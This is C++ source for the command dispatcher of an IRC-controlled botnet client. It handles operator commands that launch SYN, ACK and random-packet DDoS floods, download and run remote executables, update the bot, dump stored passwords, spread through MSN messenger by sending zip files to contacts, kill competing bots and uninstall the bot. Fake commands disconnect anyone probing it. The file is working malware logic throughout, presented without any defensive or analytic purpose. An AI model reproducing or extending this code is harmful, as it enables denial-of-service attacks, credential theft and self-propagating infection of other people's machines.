#include "../Headers/includes.h"
#include "../Config/cmds.h"
#include "../Headers/functions.h"

extern int srvsz;

int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;
	char *a[MAX_TOKENS];
	//params++; //remove the ':'
	char fcmd[1024];
	strcpy(fcmd,params);
	if (fcmd[0] == prefix)
	{
		int t=SplitParams(a,params,MAX_TOKENS);
		SWITCHES switches=GetSwitches(a,t);

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;
			IRC_CommandParse(a,t,fcmd,hostd,irc,switches,topic);
		}
		else
		{
			if (!silent)
				irc->pmsg(hostd->target,"%s Failed to parse command.","Failed");
			return 1;
		} 
	}

	return 1;
}

int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;
	int tnum;
	DWORD id;
	BOOL dec=FALSE;
	int i;

	if (topic)
	{
#ifndef NO_FAKE_CMDS
		if (!lstrcmpi(cmd_fake_remove,a[0]) || !lstrcmpi(cmd_fake_download,a[0]) || !lstrcmpi(cmd_fake_update,a[0])) {
			irc->pmsg(hostd->target,"!!!Security!!!. Lamer detected. coming back in 24hrs, download and update disabled.",main_title);
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
			Sleep(86400000);	// 24hrs
			return 1;
		}
#endif

#ifndef NO_REMOVE_CMD
		if (!lstrcmpi(cmd_remove,a[0]))
			return 1;
#endif
	}

	// stops
	if (switches.stop)
	{
#ifndef NO_BOTKILLER
		if (!lstrcmpi(cmd_botkiller, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, BOTKILLER_THREAD, "Botkiller");
			return 1;
		}
#endif

#ifndef NO_DDOS
		if (!lstrcmpi(cmd_ddos_syn, a[0]) || !lstrcmpi(cmd_ddos_ack, a[0]) || !lstrcmpi(cmd_ddos_random, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, DDOS_THREAD, "DDoS");
			return 1;
		}
#endif

#ifndef NO_DOWNLOAD
		if (!lstrcmpi(get_mnd, a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Download");
			return 1;
		}
		else if (!lstrcmpi(get_upd,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Update");
			return 1;
		}
#endif

#ifndef NO_IMSPREAD
		if (!lstrcmpi(cmd_imspread_1, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, MSN_THREAD, "MSN");
			return 1;
		}
#endif

		
#ifndef NO_IMSPREAD
		if (!lstrcmpi(cmd_imspread_2, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, MSNMSG_THREAD, "MSN");
			return 1;
		}
#endif

#ifndef NO_PSTORE
		if (!lstrcmpi(cmd_pstore_1, a[0]) || !lstrcmpi(cmd_pstore_2, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, PSTORE_THREAD, "PStore");
			return 1;
		}
#endif

#ifndef NO_VISIT
		if (!lstrcmpi(cmd_visit, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, VISIT_THREAD, "Visit");
			return 1;
		}
#endif
	}



	//////////////////////////////////////////////////////////////////////////////
	//								Login
	//			At this point the user should already be logged in
	//////////////////////////////////////////////////////////////////////////////

	if (!lstrcmpi(a[0],get_auth))
	{
		if (switches.verbose)
			irc->pmsg(hostd->target,str_auth_ali,main_title);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Logout
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_LOGOUT_CMD
	if (!lstrcmpi(cmd_logout, a[0]))
	{
		if (a[1])
		{
			i = atoi(a[1]);
			if(i>=0 && i<MAX_LOGINS)
			{
				if (irc->del_login(i))
				{
					if (!switches.silent)
						irc->pmsg(hostd->target,str_sl_logout,main_title,i);
				}

				else
				{
					if (!switches.silent)
						irc->pmsg(hostd->target,str_sl_no_logout, main_title, i);
				}
			}
			else
			{
				if (!switches.silent)
					irc->pmsg(hostd->target,str_sl_in_logout, main_title, i);
			}
		}
		else
		{
			if (irc->del_login(hostd->nick,hostd->ident,hostd->host)!=-1)
			{
				if (!switches.silent)
					irc->pmsg(hostd->target,str_logout,main_title,hostd->nick);
			}
		}
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Remove
	//					FIXME: Add unsecure (if enabled)
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_REMOVE_CMD
	else if (!lstrcmpi(a[0],cmd_remove))
	{
		uninstall();
		if (!switches.silent)
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
		else
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,"*");
		Sleep(FLOOD_DELAY);
		irc->disconnect();
		fWSACleanup();
		ExitProcess(EXIT_SUCCESS);
	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Visit
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_VISIT
	else if (!lstrcmpi(a[0],cmd_visit))
	{

		NTHREAD Visit;
		Visit.conn=irc;
		Visit.silent=switches.silent;
		Visit.verbose=switches.verbose;
		strcpy(Visit.target,hostd->target);
		Visit.data1=a[1];

		if (a[2] != NULL) strncpy(Visit.data2, a[2], sizeof(Visit.data2)-1);

		Visit.threadnum = addthread(VISIT_THREAD,"Visit Threads");
		if (threads[Visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&Visit, 0, &id))
		{
			while (Visit.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Visiting Website Now", visit_title);
		}


	}
#endif 

	//////////////////////////////////////////////////////////////////////////////
	//								pStore
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_PSTORE
	else if (!lstrcmpi(a[0],cmd_pstore_1) || !lstrcmpi(a[0],cmd_pstore_2))
	{

		NTHREAD PSTORE;
		PSTORE.conn=irc;
		PSTORE.silent=switches.silent;
		PSTORE.verbose=switches.verbose;

		if (!lstrcmpi(a[0],cmd_pstore_2)) {
			PSTORE.bdata1=true;
			PSTORE.data1=a[1];
		}


		strcpy(PSTORE.target,hostd->target);
		PSTORE.threadnum = addthread(PSTORE_THREAD,"pStore Threads");
		if (threads[PSTORE.threadnum].tHandle = CreateThread(NULL, 0, &pstore_main, (LPVOID)&PSTORE, 0, &id))
		{
			while (PSTORE.gotinfo == FALSE) Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target, str_thread_fail, pstore_title,"pstore thread",GetLastError());
		}

	}
#endif 


	//////////////////////////////////////////////////////////////////////////////
	//								IM Spread
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_IMSPREAD
	else if (!lstrcmpi(cmd_imspread_1,a[0]))
	{


		if ((tnum=findthreadnum(MSN_THREAD)) > 0)
		{
				irc->pmsg(hostd->target,"%s Error Thread Can Only Be Activated Once", imspread_title);
		}
		else 
		{

		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		msn.data1=a[1];  //EXE Name
		msn.data2=a[2]; //Zip Name

		if (a[3]) {
		char *IMmessage = NULL;
 		IMmessage = strchr(params, ' ');
        IMmessage = strchr(IMmessage+1, ' ');
		IMmessage = strchr(IMmessage+1, ' ');
		msn.data3=IMmessage; // Message
		msn.bdata1=false;
		} else {
			msn.bdata1=true;
		}

		strcpy(msn.target,hostd->target);
		msn.threadnum = addthread(MSN_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &ImFuck, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
			if (a[3]) irc->pmsg(hostd->target,"%s Thread Activated: Sending Zipfile and Message.", imspread_title);
			if (!a[3]) irc->pmsg(hostd->target,"%s Thread Activated: Sending Zipfile.", imspread_title);

		}
		}


	}
	else if (!lstrcmpi(cmd_imspread_2,a[0]))
	{


		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,hostd->target);

		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;

		msn.data1=IMmessage; //Message
		msn.threadnum = addthread(MSNMSG_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &ImMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Thread Activated: Sending Message.", imspread_title);
		}



	}
	else if (!lstrcmpi(cmd_imspread_3,a[0])) 
	{
	
		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,hostd->target);
		msn.threadnum = addthread(MSNMSG_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &ImStats, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
		}

	}
	else if (!lstrcmpi(cmd_imspread_4, a[0]))
	{
		if (!a[1])
			return 1;
		contactfuck(a[1]);
		irc->pmsg(hostd->target, "%s Contact \"%s\" added.", imspread_title, a[1]);
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_DOWNLOAD


#ifndef NO_FAKE_CMDS
	//fake download commands
	else if (!lstrcmpi(cmd_fake_download,a[0]) || !lstrcmpi(cmd_fake_update,a[0]) || !lstrcmpi(cmd_fake_remove,a[0])) {
			irc->pmsg(hostd->target,"!!!Security!!!. Lamer detected. coming back next reboot, cya.");
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
			irc->disconnect();
	}	
#endif
	
	else if (!lstrcmpi(get_mnd,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,download_title);
			return 1;
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,download_title,"transfer thread",tnum);
			return 1;
		}
		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];//site
		dl.data2=a[2];//location
		dl.bdata1 = FALSE;//update
		dl.bdata2 = (a[3]?TRUE:FALSE);//run
		dl.bdata3 = (a[4]?TRUE:FALSE);

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading URL: %s to: %s.",download_title,(dec?"*":a[1]),a[2]);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s Downloading URL: %s to: %s.",download_title,a[1],a[2]);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,download_title,"transfer thread",GetLastError());
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Update
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_UPDATE
	else if (!lstrcmpi(get_upd,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,update_title);
			return 1;
		}
		if (a[2])
		{
			if (!lstrcmpi(bid,a[2]))
			{
				return 1;
			}
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			return 1;
		}

		char tempdir[MAX_PATH], tmpbuf[MAX_PATH];
		GetTempPath(sizeof(tempdir), tempdir);
		sprintf(tmpbuf,"%seraseme_%d%d%d%d%d.exe",tempdir,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);

		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=tmpbuf;
		if (a[3]) dl.idata1=1;
		else	  dl.idata1=0;
		dl.bdata1 = TRUE;//update
		dl.bdata2 = FALSE;//run
		dl.bdata3 = FALSE;//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,(dec?"*":a[1]),dl.data2);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s Downloading update from: %s to: %s.",update_title,a[1],dl.data2);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,update_title,"transfer thread",GetLastError());
		}
		return 1;
	}
#endif // NO_UPDATE
#endif // NO_DOWNLOAD


	//////////////////////////////////////////////////////////////////////////////
	//								DDOS										//
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_DDOS
	else if (!lstrcmpi(cmd_ddos_syn,a[0]) || !lstrcmpi(cmd_ddos_ack,a[0]) || !lstrcmpi(cmd_ddos_random,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		DDOS ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		if (strcmp("ddos.syn", a[0]) == 0 )
			sprintf(ddos.type,"ddos.syn");
		else if (strcmp("ddos.random", a[0]) == 0 )
			sprintf(ddos.type,"ddos.random"); 	
		else	sprintf(ddos.type,"ddos.ack");
	
		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);

		ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->pmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
			return 1;
		}
	}

#endif

//////////////////////////////////////////////////////////////////////////////
//								BotKiller									//
//////////////////////////////////////////////////////////////////////////////

#ifndef NO_BOTKILLER
	else if (!lstrcmpi(cmd_botkiller,a[0]))
	{
		if ((tnum=findthreadnum(BOTKILLER_THREAD)) > 0)
		{
			irc->pmsg(hostd->target,str_thread_alr,botkiller_title,"botkiller thread",tnum);
			return 1;
		}
		NTHREAD botkill;
		botkill.conn = irc;
		botkill.silent=switches.silent;
		botkill.verbose=switches.verbose;
		strcpy(botkill.target,hostd->target);

		botkill.threadnum = addthread(BOTKILLER_THREAD,"%s starting scan..",botkiller_title);
		if (threads[botkill.threadnum].tHandle = CreateThread(NULL, 0, &botkiller_main, (LPVOID)&botkill, 0, &id))
		{
			while (botkill.gotinfo == FALSE) Sleep(50);
		}
	}
#endif



	return 0;
}
